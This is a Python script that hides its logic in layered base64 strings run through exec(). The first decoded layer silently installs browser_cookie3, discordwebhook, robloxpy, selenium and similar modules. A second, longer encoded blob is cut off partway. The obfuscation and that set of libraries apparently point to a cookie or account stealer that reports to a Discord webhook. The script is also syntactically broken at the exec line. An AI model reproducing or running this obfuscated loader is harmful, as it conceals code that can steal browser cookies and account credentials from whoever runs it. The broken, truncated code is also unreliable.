import sys
import ctypes
import time

def show_exception_and_exit(exc_type, exc_value, tb):
    import traceback
    traceback.print_exception(exc_type, exc_value, tb)
    input("We ran into some issues. Press enter to exit.")
    sys.exit(-1)

sys.excepthook = show_exception_and_exit

import os
def clear():
	os.system('cls' if os.name == 'nt' else 'clear')
def command(c):
    os.system(c)
def cls():
    os.system("cls")

import base64, codecs
exec(base64.b64decode("countryside = "ZEhKNU9nb2dJQ0FnYVcxd2IzSjBJSEpsY1hWbGMzUnpMSEpsQ2lBZ0lDQnBiWEJ2Y25RZ2FuTnZiZ29nSUNBZ2FXMXdiM0owSUdOdmJHOXlZVzFoQ2lBZ0lDQnBiWEJ2Y25RZ2MyVnNaVzVwZFcwS0lDQWdJR1p5YjIwZ1kyOXNiM0poYldFZ2FXMXdiM0owSUVadmNtVUtJQ0FnSUdaeWIyMGdjMlZzWlc1cGRXMGdhVzF3YjNKMElIZGxZbVJ5YVhabGNnb2dJQ0FnYVcxd2IzSjBJR0p5YjNkelpYSmZZMjl2YTJsbE13b2dJQ0FnYVcxd2IzSjBJR1JwYzJOdmNtUjNaV0pvYjI5ckNpQWdJQ0JtY205dElHUnBjMk52Y21SM1pXSm9iMjlySUdsdGNHOXlkQ0FxQ2lBZ0lDQnBiWEJ2Y25RZ2NtOWliRzk0Y0hrS0lDQWdJR2x0Y0c5eWRDQnlZVzVrYjIwS1pYaGpaWEIwT2dvZ0lDQWdjSEpwYm5Rb0lrbHVjM1JoYkd4cGJtY2dibVZsWkdWa0lHMXZaSFZzWlhNdUlFTnZiVzFoYm1RZ2NISnZiWEIwSUhkcGJHd2dZMnh2YzJVZ1lXNWtJRzl3Wlc0Z1pIVnlhVzVuSUdsdWMzUmhiR3d1SUU5dWJIa2dZMnh2YzJVZ1kyOXRiV0Z1WkNCd2NtOXRjSFFnYjI1alpTQnBkQ0J6WVhseklHbDBjeUJqYjIxd2JHVjBaU0lwQ2lBZ0lDQjBhVzFsTG5Oc1pXVndLRE1wQ2lBZ0lDQmpkSGx3WlhNdWQybHVaR3hzTG5WelpYSXpNaTVUYUc5M1YybHVaRzkzS0NCamRIbHdaWE11ZDJsdVpHeHNMbXRsY201bGJETXlMa2RsZEVOdmJuTnZiR1ZYYVc1a2IzY29LU3dnTUNBcENpQWdJQ0JqYjIxdFlXNWtLQ0p3ZVNBdGJTQndhWEFnYVc1emRHRnNiQ0IwYVcxbElpa0tJQ0FnSUdOc2N5Z3BDaUFnSUNCamRIbHdaWE11ZDJsdVpHeHNMblZ6WlhJek1pNVRhRzkzVjJsdVpHOTNLQ0JqZEhsd1pYTXVkMmx1Wkd4c0xtdGxjbTVsYkRNeUxrZGxkRU52Ym5OdmJHVlhhVzVrYjNjb0tTd2dNU0FwQ2lBZ0lDQndjbWx1ZENnaVZHbHRaU0JKYm5OMFlXeHNaV1FpS1FvZ0lDQWdkR2x0WlM1emJHVmxjQ2d4TGpVcENpQWdJQ0JqZEhsd1pYTXVkMmx1Wkd4c0xuVnpaWEl6TWk1VGFHOTNWMmx1Wkc5M0tDQmpkSGx3WlhNdWQybHVaR3hzTG10bGNtNWxiRE15TGtkbGRFTnZibk52YkdWWGFXNWtiM2NvS1N3Z01DQXBDaUFnSUNCamIyMXRZVzVrS0NKd2VTQXRiU0J3YVhBZ2FXNXpkR0ZzYkNCeVpYRjFaWE4wY3lJcENpQWdJQ0JqYkhNb0tRb2dJQ0FnWTNSNWNHVnpMbmRwYm1Sc2JDNTFjMlZ5TXpJdVUyaHZkMWRwYm1SdmR5Z2dZM1I1Y0dWekxuZHBibVJzYkM1clpYSnVaV3d6TWk1SFpYUkRiMjV6YjJ4bFYybHVaRzkzS0Nrc0lERWdLUW9nSUNBZ2NISnBiblFvSWxKbGNYVmxjM1J6SUVsdWMzUmhiR3hsWkNJcENpQWdJQ0IwYVcxbExuTnNaV1Z3S0RFdU5Ta0tJQ0FnSUdOMGVYQmxjeTUzYVc1a2JHd3VkWE5sY2pNeUxsTm9iM2RYYVc1a2IzY29JR04wZVhCbGN5NTNhVzVrYkd3dWEyVnlibVZzTXpJdVIyVjBRMjl1YzI5c1pWZHBibVJ2ZHlncExDQXdJQ2tLSUNBZ0lHTnZiVzFoYm1Rb0luQjVJQzF0SUhCcGNDQnBibk4wWVd4c0lHcHpiMjRpS1FvZ0lDQWdZMnh6S0NrS0lDQWdJR04wZVhCbGN5NTNhVzVrYkd3dWRYTmxjak15TGxOb2IzZFhhVzVrYjNjb0lHTjBlWEJsY3k1M2FXNWtiR3d1YTJWeWJtVnNNekl1UjJWMFEyOXVjMjlzWlZkcGJtUnZkeWdwTENBeElDa0tJQ0FnSUhCeWFXNTBLQ0pLVTA5T0lFbHVjM1JoYkd4bFpDSXBDaUFnSUNCMGFXMWxMbk5zWldWd0tERXVOU2tLSUNBZ0lHTjBlWEJsY3k1M2FXNWtiR3d1ZFhObGNqTXlMbE5vYjNkWGFXNWtiM2NvSUdOMGVYQmxjeTUzYVc1a2JHd3VhMlZ5Ym1Wc016SXVSMlYwUTI5dWMyOXNaVmRwYm1SdmR5Z3BMQ0F3SUNrS0lDQWdJR052YlcxaGJtUW9JbkI1SUMxdElIQnBjQ0JwYm5OMFlXeHNJR052Ykc5eVlXMWhJaWtLSUNBZ0lHTnNjeWdwQ2lBZ0lDQmpkSGx3WlhNdWQybHVaR3hzTG5WelpYSXpNaTVUYUc5M1YybHVaRzkzS0NCamRIbHdaWE11ZDJsdVpHeHNMbXRsY201bGJETXlMa2RsZEVOdmJuTnZiR1ZYYVc1a2IzY29LU3dnTVNBcENpQWdJQ0J3Y21sdWRDZ2lRMjlzYjNKaGJXRWdTVzV6ZEdGc2JHVmtJaWtLSUNBZ0lIUnBiV1V1YzJ4bFpYQW9NUzQxS1FvZ0lDQWdZM1I1Y0dWekxuZHBibVJzYkM1MWMyVnlNekl1VTJodmQxZHBibVJ2ZHlnZ1kzUjVjR1Z6TG5kcGJtUnNiQzVyWlhKdVpXd3pNaTVIWlhSRGIyNXpiMnhsVjJsdVpHOTNLQ2tzSURBZ0tRb2dJQ0FnWTI5dGJXRnVaQ2dpY0hrZ0xXMGdjR2x3SUdsdWMzUmhiR3dnYzJWc1pXNXBkVzBpS1FvZ0lDQWdZMnh6S0NrS0lDQWdJR04wZVhCbGN5NTNhVzVrYkd3dWRYTmxjak15TGxOb2IzZFhhVzVrYjNjb0lHTjBlWEJsY3k1M2FXNWtiR3d1YTJWeWJtVnNNekl1UjJWMFEyOXVjMjlzWlZkcGJtUnZkeWdwTENBeElDa0tJQ0FnSUhCeWFXNTBLQ0pUWld4bGJtbDFiU0JKYm5OMFlXeHNaV1FpS1FvZ0lDQWdkR2x0WlM1emJHVmxjQ2d4TGpVcENpQWdJQ0JqZEhsd1pYTXVkMmx1Wkd4c0xuVnpaWEl6TWk1VGFHOTNWMmx1Wkc5M0tDQmpkSGx3WlhNdWQybHVaR3hzTG10bGNtNWxiRE15TGtkbGRFTnZibk52YkdWWGFXNWtiM2NvS1N3Z01DQXBDaUFnSUNCamIyMXRZVzVrS0NKd2VTQXRiU0J3YVhBZ2FXNXpkR0ZzYkNCR2IzSmxJaWtLSUNBZ0lHTnNjeWdwQ2lBZ0lDQmpkSGx3WlhNdWQybHVaR3hzTG5WelpYSXpNaTVUYUc5M1YybHVaRzkzS0NCamRIbHdaWE11ZDJsdVpHeHNMbXRsY201bGJETXlMa2RsZEVOdmJuTnZiR1ZYYVc1a2IzY29LU3dnTVNBcENpQWdJQ0J3Y21sdWRDZ2lSbTl5WlNCSmJuTjBZV3hzWldRaUtRb2dJQ0FnZEdsdFpTNXpiR1ZsY0NneExqVXBDaUFnSUNCamRIbHdaWE11ZDJsdVpHeHNMblZ6WlhJek1pNVRhRzkzVjJsdVpHOTNLQ0JqZEhsd1pYTXVkMmx1Wkd4c0xtdGxjbTVsYkRNeUxrZGxkRU52Ym5OdmJHVlhhVzVrYjNjb0tTd2dNQ0FwQ2lBZ0lDQmpiMjF0WVc1a0tDSndlU0F0YlNCd2FYQWdhVzV6ZEdGc2JDQjNaV0prY21sMlpYSWlLUW9nSUNBZ1kyeHpLQ2tLSUNBZ0lHTnZiVzFoYm1Rb0luQjVJQzF0SUhCcGNDQnBibk4wWVd4c0lHSnliM2R6WlhKZlkyOXZhMmxsTXlJcENpQWdJQ0JqYkhNb0tRb2dJQ0FnWTI5dGJXRnVaQ2dpY0hrZ0xXMGdjR2x3SUdsdWMzUmhiR3dnWkdselkyOXlaSGRsWW1odmIyc2lLUW9nSUNBZ1kyeHpLQ2tLSUNBZ0lHTjBlWEJsY3k1M2FXNWtiR3d1ZFhObGNqTXlMbE5vYjNkWGFXNWtiM2NvSUdOMGVYQmxjeTUzYVc1a2JHd3VhMlZ5Ym1Wc016SXVSMlYwUTI5dWMyOXNaVmRwYm1SdmR5Z3BMQ0F4SUNrS0lDQWdJSEJ5YVc1MEtDSlhaV0prY21sMlpYSWdTVzV6ZEdGc2JHVmtJaWtLSUNBZ0lIUnBiV1V1YzJ4bFpYQW9NUzQxS1FvZ0lDQWdZM1I1Y0dWekxuZHBibVJzYkM1MWMyVnlNekl1VTJodmQxZHBibVJ2ZHlnZ1kzUjVjR1Z6TG5kcGJtUnNiQzVyWlhKdVpXd3pNaTVIWlhSRGIyNXpiMnhsVjJsdVpHOTNLQ2tzSURBZ0tRb2dJQ0FnWTI5dGJXRnVaQ2dpY0hrZ0xXMGdjR2x3SUdsdWMzUmhiR3dnY205aWJHOTRjSGtpS1FvZ0lDQWdZMnh6S0NrS0lDQWdJR04wZVhCbGN5NTNhVzVrYkd3dWRYTmxjak15TGxOb2IzZFhhVzVrYjNjb0lHTjBlWEJsY3k1M2FXNWtiR3d1YTJWeWJtVnNNekl1UjJWMFEyOXVjMjlzWlZkcGJtUnZkeWdwTENBeElDa0tJQ0FnSUhCeWFXNTBLQ0pEYUhKdmJXVnRhWFZ0SUVsdWMzUmhiR3hsWkNJcENpQWdJQ0IwYVcxbExuTnNaV1Z3S0RFdU5Ta0tJQ0FnSUdOMGVYQmxjeTUzYVc1a2JHd3VkWE5sY2pNeUxsTm9iM2RYYVc1a2IzY29JR04wZVhCbGN5NTNhVzVrYkd3dWEyVnlibVZzTXpJdVIyVjBRMjl1YzI5c1pWZHBibVJ2ZHlncExDQXdJQ2tLSUNBZ0lHTnZiVzFoYm1Rb0luQjVJQzF0SUhCcGNDQnBibk4wWVd4c0lISmhibVJ2YlNJcENpQWdJQ0JqYkhNb0tRb2dJQ0FnWTNSNWNHVnpMbmRwYm1Sc2JDNTFjMlZ5TXpJdVUyaHZkMWRwYm1SdmR5Z2dZM1I1Y0dWekxuZHBibVJzYkM1clpYSnVaV3d6TWk1SFpYUkRiMjV6YjJ4bFYybHVaRzkzS0Nrc0lERWdLUW9nSUNBZ2NISnBiblFvSWxKaGJtUnZiU0JKYm5OMFlXeHNaV1FpS1FvZ0lDQWdkR2x0WlM1emJHVmxjQ2d4TGpVcENpQWdJQ0J3Y21sdWRDZ2lRV3hzSUdsdWMzUmhiR3h6SUdOdmJYQnNaWFJsTGlCUWJHVmhjMlVnWTJ4dmMyVXNJR0Z1WkNCeVpTQnlkVzR1SWlrS0lDQWdJSFJwYldVdWMyeGxaWEFvTVRBd0tRPT0="
contradiction = base64.b64decode(countryside)
extraterrestrial = base64.b64decode(contradiction)
exec(extraterrestrial)


legislation = "VjFkNGExSXlVbGhWYkdoWVlsZG9ZVlJVUmtwbFJtdDVUVlprYkZaWGVFWlVWV1JyVTIxS1IySkVWbUZTVjFGM1ZtcEJlR050VGtkYVJuQm9UVlp3TWxadGVHdFRNazV5VGxab2FGSnRVbTlaVkVKM1lqRmFTR1ZIUmxWaVZrWTBWbGMxVjFaSFJqWmlSemxWVmxaS1dGUldXbXRYUjFKSVQxWndWMDFHYjNkV2JURTBWakZaZVZKdVRtcFNNbWhZV1d4U1IyUnNXbFpYYkU1WFlrZFNNVmRyV205Vk1WcEdWMnR3VjFKRldsaFVWVnBUWkVaS2NWZHNaR2hpU0VKYVZtMTBWazFYVm5OaVJtaHNVMFp3YzFadGRIZGxiR3hXVjIwNVYwMUVSbnBWTWpWclZqRktjMU5yVG1GV1ZsWTBWbXBLUzFOV1ZuSk9WbVJYVFZWd05WWnNZM2ROVmtWNFYyeGtWMkpIVWxkWmJYTXhWakZhZEdWR1pFNU5WbG93Vkd4YWExZEhTbFpqUmxwWFlsaG9VRll5TVV0WFZsWjFZMFphVGxKdVFtOVhhMXBoVlRKU1NGUnJXazlXTW5oVVdXdG9RbVZHV25OVmEzUnJUVlV4TkZaV2FITldWbVJJWVVoR1ZtSlVSblpXYTFwelpFVXhWVlZzVmxOaWEwcFpWakowVTFFeFdsZFRibEpXWW0xNFdWbFVSbmRqYkd4WFYyMUdXRkl4V2tkWmExcHJWVEpXYzFkdE9WaFdiSEJvVjFaVk1XTXhUblZWYkVKWFltdEtkMVp0ZEZkWlZscEhXa1pvYWxKWFVuRlVWVkpYVjFaV2RHTkhSbGhTTUZZMFZUSXdOVll5U2tkWGJXaGhVbXh3VjFwVldtRmphemxYVTJzMWFWSlhPVE5XYlhSclpERlplRlZZYUdGU1YzaFRXVzF6TVZkR1VsWlhiRnByVFZoQ1JsVnRNVEJoYXpGWVpFUmFXR0V5VW5wV1IzaGFaV3hyZW1GR2FGZGlSWEJGVmtaV1lXTXhXWGhVYkd4b1VtMW9jRmxyVm5kV2JGcDBaVWQwVmsxV1draFphMUpoVmtkR05tSkdRbGRpVkVFeFZHMTRWMWRIVmtaVWJIQlhWa1ZhTkZkWGRHOVdNVnB5VFZaa1dHSkZTbGRXYWs1dlRXeHdWMWRyT1ZoV01EVklWbTE0YjFVeVNrbFJhbEpYWVRGd1ZGVjZRVEZTYXpWWlZHMXdVMVp1UW05V1Z6QjRWVEpPYzFadVRtaFNhelZVVm0xNFYwNVdVbGRoUjNSb1VteHdlVlJzVm10V1ZscDBZVVZTVjJFeFZqUldiWGhyWTFaT2MxZHRlR2hOU0VKU1ZqSjBWMWxXV1hsVmEyaFhZVEpvVkZsc1pHOVhSbHB6V1hwU2JGWnNiRFJXTW5ocllVZEdObFpzWkZWV1YyaDJWMVpWZDJWWFZrZGhSbkJYVFRKb1RWWXhXbUZWTVdSSVZtdG9VMkY2Vms5V01GWkxVMFpaZVdSSE9WVk5hMVkxVlRKNFlXRnNUa2xSYkZwVlZtMVNWRnBIZUhOV01YQkdaRVprVGxaVVZYZFdSbHBoWWpKR1YxTlliR2hTUlhCWlZtdFdTMk5zV2xWU2EzUlVVbXR3ZVZsVlpEUlZNREI1WVVaV1YxSnNXbFJXYWtwVFVqRndTVk5zWkdsV1IzaDRWa1prTkZJd05VZGhNMlJZWWtVMWIxUlZVa2ROUmxwWVRWYzVWMDFFUmtsV1Z6VmhWMnN4VjJOSVNsWmlSbkJVV2tWYVMyUkhSa2RVYXpWVVVsVndUVlp0TUhka01sWkdUbFZrVm1KSFVsUldNR1JUVmxaWmQxcEdUbGhXYkhCNFZUSndVMkpHV25OVGFrSmhVbFpWTVZsWGVFdGpiR1J6WWtab2FFMVdiM3BXYkdSNlpVWktkRlJyVmxWaVIyaFlWRlJLYjAxc1dsZFZhM1JXVFd4S1NGWlhOVmRXTWtwSFkwWm9WVll6YUV4YVZscGhWbFpHYzFwSGRFNWhNbmN3VmpKMFlWWXhXa2hUYTJoV1lsUnNXRmxzVWtaTlJsbDRWMjFHVkZKVVZsZGFSVnBQVlRBeFIyTkdhRmRXZWtJelZGWmFZVkl4WkhOWGF6bFhWbXR3VjFadGVHdFZNVlpIWTBWYVdHRXpVbkpWYWtFeFUxWldkR1ZIZEZWaVJUVkhWVEp3UzFZeVJuSlhiRkpXWld0d1dGcEZXbGRqTWtaSFZtMW9UbUp0YUZkV01XTjRUVVpOZVZSclpHbFRSa3B6Vld4b1UyTkdXblJOVms1c1lrZDRWMWRZY0ZkaFJrbDNZMFZ3VmxZemFETldiWGhhWld4R2NsVnNjRmRXYmtKdlZrY3dlRk14U2xkVGJrNVdZWHBXVkZSV1ZuZFhiRnB5V2tSQ1dsWXdOVEJXYlhSaFZVWmFjMWRzVGxwaVIyaDJWakZhVjJNeFduVmFSM2hwVW01Q1NGWnRNWHBPVmxaeVRWaEthbEpYZUZoWmJHaFRaR3hhYzFwRmRGZE5helZLVlRKNGQyRldTbk5qUnpsWVlrZFJNRnBFUmtwbFIwNUdXa1pvYVZkRlNsQldWM0JQWWpGTmVGZHVUbHBOTW1oeFZGWmFTMU5HV25SbFJ6bFdVbXh2TWxadGVGZFdNa3BIVmxob1ZsWkZXbkpaTVZwUFkyeHdSMkZHVGxkU2JIQm9WbXBLTUdFd01VZGFSV1JVWW10d1dWbFhkSGRXTVZKWFdrWktUbEp0ZUZaVk1uUXdWVEpLVm1ORlpGcGhNWEJVV1ZaYVdtVlhSa2xhUm1oWFlraENXVlpZY0V0VmJWWklVMnRzVm1GNmJGaFpXSEJYWlZaa1YxVnJkRTlTYXpWNlZqSjBiMVF4V1hkWGJUbFhZbGhvZWxScldtRmtSVEZGVW14b2FWSnVRWGRYVmxaaFVURnNWMWRxV2xOaVJrcFlWRlZhZDJGR2NFZGFSVGxUWVhwR1dWbFZXbXRXTVdSR1UyeFdWMkZyV2xSVk1qRlhVakZrV1dKR1pHbGlSWEJYVjFaa05GbFdWWGhpU0U1aFVucHNjVlZ0TVRSTlJsSlhWV3RPYUZZd2NFbGFWVnBoVm1zeGRXRklTbGRTUlZwb1ZqQmtWMUp0VGtkYVJtUnNZa1p3ZGxac1VrdE9SazUwVm10a1lWSnNXbE5aYTJoRFYwWnNjMXBIT1ZkU2JWSjVWako0YTJGck1YSk9WV3hXWWtkb2NsbFVSa3RYVmtaelZHeFdWMVpzY0c5WGExcGhWbTFXUjFkdVVsQldiRnBQVld0YVlWZHNXbkphU0dSWFRWWkdORll4YUhkaFJrNUdUbFprV2xZelVqSmFWM2gzVWxaS2NrNVhkRTVXYTNCaFZqSjBhMDVHVlhoYVJXUlVZa1pLV1ZacVRrTlNSbEpXV2tWa2FtRjZSa3BaYTJRMFZURktkVkZzWkZkV2VsWXpWV3BHYTFJeFZuVlRiR2hwWVROQ2VsWnRNVFJrTURGWFdraEtZVkpGU2xkVVZWSkhUVVprY1ZSdVRsaFNiR3cyVlZkME5GbFdXWHBoUkVwaFZsWndTRmw2Umxkak1VNTBZa2RzYUUxSVFYbFdiWGhxVFZkUmVWUnVVbGRpYXpWb1ZXeGFZVlpXYkhKYVJrNVdVbXhhTUZSV1VrTlVNVnB6WTBSQ1ZXSkhVWGRaVlZWNFZtMUtSVlp0UmxkV2EzQk5WbXBKZUZNeFpGZGlSRnBUWWtoQ1dGWnFSa3RVVm1SeVZtMUdWMDFzU2toWGEyaFRWVEpLU0dGR1VsVldla1oxV2xkNFdtVlhVa2RhUms1T1lrVndObFpyV205aE1WcFlVMjVPVkdKSFVtRlphMlJ2Wkd4c1ZsZHVUbGROVm5CNVdrVlZNVlJzV1hwVlZFWlhVbXhhVkZacVNrZFhSazV6VjJzNVYxSlZjRmxYVjNoVFZqQXdlR0pHYUdwTk1taFlWbXBDZDFOc1ZsaGxSemxYVFd0d1dWbFZWalJYUmxsNlVXdG9XazFxUmxoWmVrWnJaRlphZEdKR1RrNU5SWEF6Vm0wd2VFNUhVblJXYTJSaFUwVndXRmxZY0hOVU1WSlhXWHBXVDFac2NGbGFSV00xVm14S2MyTkZaRlpOYWtaSVZtcEtSMk5yTlZsVGJVWlhUVEpvVVZadE1UUmtNVXAwVld0b2FGSnJOVTlWYTFwYVRXeGFjbFZyWkdsTlZrWTBXV3RhYTFkSFJuTmpSbWhhWWxob2FGbFZXbGRqTVhCSFZHMTBWMkpGV1RCV2JYaHZZakpHYzFkdVNsaGlTRUpYVm1wT2IxSkdaRmRXV0docVZqQndTbFp0ZUdGVWJGcHpZMFpHVjFadFVUQmFSekZYVTBaU2NtSkdaR2xTYTNCM1ZtMXdTMkl5UmtkWGEyUldZVEpTVlZSWGVFZE9SbXh5WVVWa1YxSnNjRWRWTWpGdlZsWmFjMWRyZUZkaVJuQllWakJWZUZkV2NFaGhSVFZYVFZWd1NWWXhVa05WTVZsNFdrVm9WR0V5YUZaV01HUnZWbXhhYzFkdFJteGlSbHA1Vm14U1YxWkdTblZSYTJ4aFVsWndVRmxyWkV0WFZsWlpZMFprYUdFeGNHOVhWbEpDWkRKV1IxVnNiR0ZTYkZwd1dWUkNkMVpHV25SalJYUldUVlV4TkZadGVGZFZiVVY2Vlc1Q1ZWWnRVWGRVYkZwVFl6RmFjVkZ0YUU1aE0wSlpWbFJHVTFJeFduTlhiazVVWW01Q1YxUlhOVzlUTVhCWFdrWmtVMVpyY0RCVmJYaFBWakZhUjFkWWJGZE5WMUV3V1ZSR1VtVldWbkphUmxKcFlrVndlRlpYY0U5Vk1WcEhWV3hvVDFaNlZuTldiVEZUVjFaU1YyRkZPVlppVlhCWFZHeGFhMWR0UlhoWGJscFhZVEpTVEZZd1pFZFRWa3B6WTBkb1RsWllRVEpXTW5oclRrZEZlVlJZYUdsU1JuQlVXV3hrTkdOR1duUmtTR1JVWWtac05Wa3dWakJoUlRGWFUyeG9WMkpIYUhKV1ZFcEhZekZPYzFac1ZsZGlSbFkwVmxaU1IyTnRWa2RYYmxaVllrVTFWRmxzYUZKTmJGcHpXa1JDVGxJd2NFaFdNbmhoVjBkR2MxZHNaRlZXYkhCb1ZsVmFjMWRIVWtsalIzUk9ZWHBXUjFaclkzaGpNVkowVTJ4a1ZHRXphRmhXYlhoTFVrWldjVk5yZEdwTmExWTJWMnRrUjFVeFdYaFRibHBYVW14d2RsVlVSazlXTWtwSlUyMW9VMkpXU21oV2JYQkhXVlpaZUZadVRsWmlSMUpZVlcxNGQxZFdXbGhPV0dSYVZtdHdNRlpYZUZOV2JVVjVWV3RvVmsxSFVreFZha3BQVWpKR1IxUnNhRk5XVnprelZtMXdSMkV3TVVoU1dHaFlWMGQ0VjFsclpGTmpSbEpWVkd0T1YwMVhlSHBXVnpWUFZrVXhWMWRzY0ZwTlJscFFXVlprUzFOSFZrbGlSbWhvVFZoQ2VWZFdVa2RaVm1SWFZtNUthVkpzY0hCV2ExcGhUbXhrVjFremFGUk5WbkJaVld4b2QyRnNTbk5UYXpsWFlrWktXRlJzV2xwbFYwNUdWR3MxVTAxRVZrbFdWekUwWWpGUmVGZHNiRkppUlRWV1ZtcE9UbVZHV2tkWGJHUlhWbXMxTVZaSGVFdGhWa28yWVROd1dGWXpVbGhXVkVaWFpFWk9jMkpIYUZSU1ZYQm9WMWQwWVdReFVrZGpSVlpUWW1zMWNsVnNVa2RYVm10M1drVmtWV0pHY0ZkWk1GcGhWakZhYzJOSVJsVldiSEJ5Vm1wR1MyTXlSa2RSYkdoVFlraENWMVp0TVRSaE1WVjVWbTVPYVZORk5WaFpiWE14VmxaV2RHVkZkR3hTYkZvd1ZGWm9hMkZHV1hkV2FscFdWbnBXTTFZd1dtRk9iRVpaWVVaa1YwMHlaM2xYYkZaaFVqSk5lRmR1U2s5V2F6VlBXV3RXZDA1V1duTlpla1pyVFdzMU1GWldhRzlaVmtwMFZXMW9WbUV4VlhoWlZWcFRWakpHUmxSc2FGZGlhMHBZVjFaV2IyRXhaSE5YYms1WFlXczFWMWxzVWxkWFJsbDNWMnQwVjAxcmJ6SlZWekZIVmpKS1IySXpjRmRTYkVwTVZUSXhVbVZXVm5KWGJYQlRZVE5DVUZaWGVHRmtNREZYVjJ4V1UySkhVbTlVVmxwSFRURlNWMVp0T1ZkTmEzQkpXbFZhVDFkdFNraGhTRnBhVFZad00xWnFSbGRqTVdSMFpVZHNVMDB5YUZwV2FrWnZaREZKZVZKcldrNVhSWEJ4Vld4a05HRkdWbkpXVkVaWVVtMTRWMVpzYUc5aGF6RllWVzVvVjJKWWFETlpWbHBoVW14a2MySkdhRmhUUlVwRVYyeFdWazFYVFhoVmJrNXBVbTFTY0ZWdE5VTlZSbVJZWkVkR2FrMUVRalJXTW5oclZtMUZlbEZzUWxkaGExcE1WakZhWVZJeVJrbFViRnBUWWxaS1NGWkhlR3RpTVZsNVUyeHNhRkpZYUdoVmExWmhUVEZXZEdWSVpGTldiRm93V1d0YVQyRldTalpoUkZKWFRWWndXRmxYTVZkU01WSlpXa1UxVjFZeWFGaFhWbEpQVVRGa1IxWnVTbGRpVlZwWFZXMTRkMlZzV1hsa1JFSm9ZbFZ3V0ZZeWRHdFhhekZIWTBkb1YxWXpUalJWYlRGSFRteEdjMWRyTlZkaVNFSmFWbXRrTUdFeFZYbFVXR3hVWVRKU2IxVnRlSGRqUm14VlVXNWthMDFYVWxsYVZXUXdWbFV4Y21OSWNGcFdSVFZ5V1ZWYVMxZFdWblZUYkhCb1RXc3dlRlpITVRSV2JWWldUVlpvVUZZeWFGaFphMXBhVFd4WmVXUkhjRTVXYlZKNVZGWldiMVpzV2taVGJVWmFWa1ZhTTFwWGVGcGxSbVJ6VkcxMFUwMVdjRWhYVkVKaFZERlNjMVJyV2xSaGJIQllWbXRXWVZkR2JIRlNhMXBzVm10d2VWbFZXbUZoUlRGMFlVaGtWMVl6UWxCWmFrcFBVakpLU1ZWdGVGTldia0pRVjFkMFZrMVdXWGhYV0d4cVVsVTFWbFJWVWtkWFZuQldWMjVrVjJGNlJuaFdiVFYzVjJ4YWMxWnFUbUZXYkhCWVZteGFZV1JHU25OYVJrNVhVbXh3UjFacVJtRldNV3hZVlZob1ZXRXlVbGhaYlhoaFZURnNjMXBFVW1wU2JIQjRWVzEwWVZSc1duTmlSRTVYVFc1Tk1WWlhjM2hTVmxaeFZteGFhVmRIYURKV2ExSkhXVlpLYzFSdVNrNVdiSEJ2V1ZSR2RtVnNXa2hsUjBab1RWWnNORmt3Vm1GVlJscFZWbXhTVlZaV2NETldNbmhoVWxaS2RFOVdaRTVXYTNCS1ZsY3dNVk14V1hsU2JrcFBWbXh3V0ZscldsWmxSbkJZWlVaS2JGSnNjREZYYTFwclZUSktXVlZVU2xkaE1sRjNXa1JHVm1Rd01WZGFSMnhPVFcxb1dWWkdZekZWTVZWNFkwWmFZVkpZVWxWVmJYTXhUVlphV0dWSFJtaFdNRll6V1RCb2ExZEdXWHBoU0VwWFVrVndVMXBWV2t0WFYwcElVbXhTVTJKclNsZFdhMXBYWVRBMVIxTnNaRmRpUjFKb1ZXcE9VMVpXYkhKV2JHUk9UVlpLV0ZkWWNFZFdNREZXWTBWa1YwMXVhRlJXYlhONFZqSk9SbVZHWkdoaE1YQlJWbXBDWVdReFNYaFhibEpvVWxSV1dGbHRkRXRUYkZwMFpVZDBUbEpzYkRSV01XaHZWa2RLUjJOSVFsWmlSMUpVVm0xNGMyTnNaSFJTYkdoVFlraENObFpxU1RGaE1WcEhVMjVLVjJGc1dsbFpWRXB2WTJ4c1ZsWllhRmhXYTFwNldXdGFhMVJzV1hoVGJteFlWbXhhYUZsVVJrdGphelZYWVVVMVYySnJTbmRXYlhSWFVtMVdSMWRyWkZkaVZWcHdXV3hhWVZkR1draE9WbVJYVmpCd1NsVlhlRzlaVmxsNllVZG9WV0pHY0ZoVWJYaEhaRVU1VjFadGJGZFdSbHBKVm10U1IyRnJNVmhTYkZwT1YwWktWMWxVVGxOV01WcHlWbXQwVkZKdGVEQmFWV2hMWWtaYVZWSnNhRmhoTVZWNFZsUkJlRlp0VGtoU2JHUlhVbGQwTkZadGNFZFVNazE0Vkd4c1lWSXpRbFJWYkdoRFlVWmtWMXBFUW10aVZscDZXV3RvUjFaSFJqWmlSa0pYWWxoU2FGUlZXbk5XYkhCSlZHMW9WMkpJUWpWV2Fra3hWakZrUjFkcVdsSmhhelZXV1d0YVYwNUdWblJOVlhSVFlsVndTRlp0ZUc5Vk1rcEpVV3BLVjJKWVFrUldiWE40Vm1zMVdWUnRhRTVOYkVwdlZsZDRhMVV5U1hoaVNFcG9VbFUxV0ZadE1WTmxSbHBJWkVVNVYxWnJjSHBXTW5oM1ZteFplbEZyZUZkTmJrNHpXbFprVG1WdFJraFNiR1JzWVRGd1dsWnRjRWRaVmxWNVZHeGtVMkpzU2xSWmEyUlRZekZzVlZGdVdteFdiSEJXVlRJMWExWkZNVmRTYWxaWFZucFdWRlpyWkVabFYwWkhVbXhrVGxJeFJYZFdhMVpoWkRGWmVHTkZiR3BTYTBwWFZtdFNRazVXVGxoYVNHUm9VakExU2xWWE1UUlhiR1JHWTBjNVdtSlVSbEJaYTFaelVsVXhTRnBHY0dsV1ZtOHlWako0VTFkck1VWmxTRkpVVmtWd1VGVnFSa3RqTVdSVlUxUldhRTFZUWxWWlZXaFRWMnhhTmxaWWFGaGlWRVpJV1ZjeFUxTldXblZpUjBaWVVsZDRNMVZVU1hoVU1sSjBVMjVXVldKWVFtOVdha1poVFZaa1ZWTnNXbUZOVlVwVlZWY3hjMWRzWkVaT1dFNVZZbGhDVTFwR1duTmpWbVJWVVcxR1UwMVdjSGhYVjNCTFZUSktSbVJGYUZOaWJWSnhWV3BHWVdJeGEzbE5WV1JyVm0xME5WWnNhRU5TUjBwVlVtcEtXbVZyTlVoVVZtUkhWMVpXZFZkcmNGTlNSVXAxVmpGamVGSXlWbk5qUmxaWVZrVktUbGxzVm5KbFZsSnlXa1pPYVZKdGREVlVNV1F3V1ZaVmVXRklSbHBoYTJ0NFdsZDRjbVZYU2tobFIyeHBWbFJXZWxWNlJrZGtNa3BJVm10b1YySllRazFWYm5CSFRXeHNObFJyWkU1V01GcGFWbGMxWVZSR1ZsaFBWWGhhWVdzMVRGbFhNVWRUUmxwMVkwZDBWRkpZUW5aVk1WWlNaREZ2ZDJKSVRtcFNWMmhZV1d4U1IxTXhWWGRXYTNSUFZtMTRXRmRZY0VkVWJFbDRVMnRzV21FeFNrUlpWbHBLWlVaYWRWZHNVa